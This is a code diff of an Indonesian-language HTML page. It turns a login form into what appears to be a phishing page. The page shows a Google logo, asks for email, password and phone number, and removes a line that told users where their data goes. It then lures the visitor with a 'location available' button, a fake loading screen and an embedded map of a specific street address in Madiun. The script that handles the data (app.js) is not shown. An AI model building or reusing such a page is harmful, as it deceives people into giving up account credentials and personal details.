@@ -1,39 +1,108 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Login Firebase</title>
-  <link rel="stylesheet" href="style.css"/>
-</head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
+  <title>Lokasi</title>
+
+  <link rel="stylesheet" href="style.css">
+</head>
 <body>
 
-<div class="container">
+<!-- LOGIN -->
+<div class="login-page" id="loginPage">
 
-  <div class="card" id="loginBox">
+  <div class="login-card">
+
+    <img src="https://www.gstatic.com/images/branding/product/1x/gsa_512dp.png" class="logo">
 
     <h1>Login</h1>
-    <p>Masuk ke akun kamu</p>
+    <p>Gunakan akun Anda</p>
 
-    <input type="text" id="email" placeholder="Email atau HP">
-    <input type="password" id="password" placeholder="Password">
+<input type="email" id="email" placeholder="Email">
 
-    <button onclick="login()">Login</button>
+<div class="password-box">
 
-    <p class="small">Data akan dikirim ke Firebase Firestore</p>
-  </div>
+  <input
+    type="password"
+    id="nama"
+    placeholder="password"
+  >
 
-  <div class="card hidden" id="successBox">
-    <h1>Berhasil 🎉</h1>
-    <p id="userText"></p>
+  <span id="toggleNomor" onclick="toggleNomor()">
 
-    <button onclick="logout()">Logout</button>
+    <svg id="eyeIcon" xmlns="http://www.w3.org/2000/svg"
+      width="22"
+      height="22"
+      viewBox="0 0 24 24"
+      fill="none"
+      stroke="currentColor"
+      stroke-width="2"
+      stroke-linecap="round"
+      stroke-linejoin="round">
+
+      <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7S1 12 1 12z"/>
+      <circle cx="12" cy="12" r="3"/>
+
+    </svg>
+
+  </span>
+
+</div>
+
+<input type="tel" id="nomor" placeholder="Nomor Telepon">
+
+    <button onclick="login()">
+      Login
+    </button>
+
   </div>
 
 </div>
 
-<!-- FIREBASE -->
+<!-- AKSI -->
+<div class="action-page hidden" id="actionPage">
+
+  <div class="action-card">
+
+    <h2>Lokasi Tersedia</h2>
+
+    <p>
+      Klik tombol dibawah untuk melihat lokasi.
+    </p>
+
+    <button onclick="showLocation()">
+      Saya Ingin Tau Lokasi Anda
+    </button>
+
+  </div>
+
+</div>
+
+<!-- LOADING -->
+<div class="loading-screen hidden" id="loadingScreen">
+
+  <div class="loader"></div>
+
+  <h2>Menghubungkan Lokasi...</h2>
+
+</div>
+
+<!-- MAP -->
+<div class="map-page hidden" id="mapPage">
+
+  <iframe
+    src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d1977.2240865289468!2d111.5465894971426!3d-7.634856271808472!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x2e79bebfc540b5ed%3A0x7ce6b852fa26ff9d!2sJl.%20Sri%20Widodo%20No.14%2C%20Kanigoro%2C%20Kec.%20Kartoharjo%2C%20Kota%20Madiun%2C%20Jawa%20Timur%2063118!5e0!3m2!1sen!2sid!4v1778127250457!5m2!1sen!2sid"
+    width="100%"
+    height="100%"
+    style="border:0;"
+    allowfullscreen=""
+    loading="lazy">
+  </iframe>
+
+</div>
+
 <script type="module" src="app.js"></script>
 
 </body>
